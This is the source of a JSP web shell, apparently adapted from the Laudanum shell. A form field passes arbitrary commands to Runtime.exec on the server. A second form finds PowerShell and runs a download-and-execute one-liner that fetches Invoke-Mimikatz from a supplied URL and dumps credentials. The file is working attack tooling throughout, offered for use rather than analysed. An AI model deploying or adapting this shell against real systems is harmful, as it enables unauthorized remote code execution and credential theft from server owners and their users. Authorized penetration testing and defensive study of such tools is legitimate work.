<%@ page import="java.util.*,java.io.*"%>

<HTML>
<TITLE>Laudanum JSP Shell</TITLE>
<BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send"><br/>
If you use this against a Windows box you may need to prefix your command with cmd.exe /c
</FORM>
<FORM METHOD="GET" NAME="myform2" ACTION="">
<INPUT TYPE="text" name="mimilink"><br/>
<INPUT TYPE="submit" name="auto" VALUE="Run Mimikatz"><br/>
URL to the Invoke-Mimikatz powershell file
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
	out.println("Command: " + request.getParameter("cmd") + "<BR>");
	Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
	OutputStream os = p.getOutputStream();
	InputStream in = p.getInputStream();
	DataInputStream dis = new DataInputStream(in);
	String disr = dis.readLine();
	while ( disr != null ) {
		out.println(disr);
		disr = dis.readLine();
	}
	p.getOutputStream().close();
	p.getInputStream().close();
}


if (request.getParameter("mimilink") != null) {
	out.println("Determining Architecture<BR>");
	Process r = Runtime.getRuntime().exec("cmd /c reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v PROCESSOR_ARCHITECTURE");
	OutputStream ros = r.getOutputStream();
	InputStream rin = r.getInputStream();
	DataInputStream rdis = new DataInputStream(rin);
	String rdisr = rdis.readLine();
	String arch = "";
	String path = "";
	while ( rdisr != null ) {
		if (rdisr.contains("64")){
			arch = "64";
			out.println("Architecture is 64-bit<BR>");
		}else if (rdisr.contains("32")){
			arch = "32";
			out.println("Architecture is 32-bit<BR>");
		}
		rdisr = rdis.readLine();
	}
	
	if (arch == "64"){
		//Search for 64 bit powershell
		Process f = Runtime.getRuntime().exec("cmd /c dir %windir%\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe");
		OutputStream fos = f.getOutputStream();
		InputStream fin = f.getInputStream();
		DataInputStream fdis = new DataInputStream(fin);
		String fdisr = fdis.readLine();
		if ( fdisr == null ) {
			out.println("The folder %windir%\\sysnative\\ was either not found or did not contain powershell<BR>");
			out.println("Searching for other 64-bit powershell locations, this may take some time.<BR>");			
			Process s64 = Runtime.getRuntime().exec("cmd /c dir /S %windir%\\powershell.exe");
			OutputStream s64os = s64.getOutputStream();
			InputStream s64in = s64.getInputStream();
			DataInputStream s64dis = new DataInputStream(s64in);
			String s64disr = s64dis.readLine();
			s64disr = s64dis.readLine();
			while ( s64disr != null ) {
				if (s64disr.contains("amd64_microsoft-windows-powershell-exe")){
					String[] s64elements = s64disr.split(" ");
					path = s64elements[3] + "\\powershell.exe";
					out.println("Powershell found at " + s64elements[3] +"<BR>");
					break;
				}
				s64disr = s64dis.readLine();
			}
		} else {
			while ( fdisr != null ) {
				if (fdisr.contains("powershell.exe")){
					path= "C:\\windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe";
					out.println("Found 64-bit Powershell in %windir%\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe<BR>");
					break;
				}else if (fdisr.contains("File Not Found") || fdisr.contains("cannot find")){
					out.println("The folder %windir%\\sysnative\\ was either not found or did not contain powershell<BR>");
					out.println("Searching for other 64-bit powershell locations, this may take some time.<BR>");			
					Process s64 = Runtime.getRuntime().exec("cmd /c dir /S %windir%\\powershell.exe");
					OutputStream s64os = s64.getOutputStream();
					InputStream s64in = s64.getInputStream();
					DataInputStream s64dis = new DataInputStream(s64in);
					String s64disr = s64dis.readLine();
					s64disr = s64dis.readLine();
					while ( s64disr != null ) {
						if (s64disr.contains("amd64_microsoft-windows-powershell-exe")){
							String[] s64elements = s64disr.split(" ");
							path = s64elements[3] + "\\powershell.exe";
							out.println("Powershell found at " + s64elements[3] +"<BR>");
							break;
						}
						s64disr = s64dis.readLine();
					}
				}
			fdisr = fdis.readLine();
			//add error about path not found
			}
		}
	} else if (arch == "32") {
		Process f32 = Runtime.getRuntime().exec("cmd /c IF exist %windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe ( cmd /c echo Found) ELSE ( cmd /c echo Missing)");
		OutputStream f32os = f32.getOutputStream();
		InputStream f32in = f32.getInputStream();
		DataInputStream f32dis = new DataInputStream(f32in);
		String f32disr = f32dis.readLine();
		if (f32disr == null){
			out.println("The executable %windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe was either not found<BR>");
			out.println("Searching for other powershell locations, this may take some time.<BR>");			
			Process s32 = Runtime.getRuntime().exec("cmd /c dir /S %windir%\\powershell.exe");
			OutputStream s32os = s32.getOutputStream();
			InputStream s32in = s32.getInputStream();
			DataInputStream s32dis = new DataInputStream(s32in);
			String s32disr = s32dis.readLine();
			s32disr = s32dis.readLine();
			while ( s32disr != null ) {
				if (s32disr.contains("microsoft-windows-powershell-exe")){
					String[] s32elements = s32disr.split(" ");
					path = s32elements[3] + "\\powershell.exe";
					out.println("Powershell found at " + s32elements[3] +"<BR>");
					break;
				}
				s32disr = s32dis.readLine();
			}
		} else {		
			while ( f32disr != null ) {
				if (f32disr.contains("powershell.exe")){
					path= "%windir%\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe";
					out.println("Found Powershell in %windir%\\system32\\WindowsPowerShell\\v1.0\\<BR>");
					break;
				} else if (f32disr.contains("File Not Found")){
					out.println("The executable %windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe was either not found<BR>");
					out.println("Searching for other powershell locations, this may take some time.<BR>");			
					Process s32 = Runtime.getRuntime().exec("cmd /c dir /S %windir%\\powershell.exe");
					OutputStream s32os = s32.getOutputStream();
					InputStream s32in = s32.getInputStream();
					DataInputStream s32dis = new DataInputStream(s32in);
					String s32disr = s32dis.readLine();
					s32disr = s32dis.readLine();
					while ( s32disr != null ) {
						if (s32disr.contains("microsoft-windows-powershell-exe")){
							String[] s32elements = s32disr.split(" ");
							path = s32elements[3] + "\\powershell.exe";
							out.println("Powershell found at " + s32elements[3] +"<BR>");
							break;
						}
						s32disr = s32dis.readLine();
					}
				}
			}
		}
		//add error is path not found
	}
	out.println("Retrieving and Running Mimikatz, be patient.<BR>");		
	out.println("The command that will be executed is<br>");
	String mimicmd = path + " -NonInteractive -Command \"IEX (New-Object Net.WebClient).DownloadString(\'" + request.getParameter("mimilink") + "\'); Invoke-Mimikatz -DumpCreds\"";
	out.println(mimicmd+"<br>");
	Process m = Runtime.getRuntime().exec(mimicmd);
	OutputStream mos = m.getOutputStream();
	InputStream min = m.getInputStream();
	DataInputStream mdis = new DataInputStream(min);
	String mdisr = mdis.readLine();
	while ( mdisr != null ) {
		out.println(mdisr);
		mdisr = mdis.readLine();
	}
	m.getOutputStream().close();
	m.getInputStream().close();

}
%>
</pre>
<hr/>
<address>
Based on the Laudanum JSP shell.
</address>
</BODY></HTML>
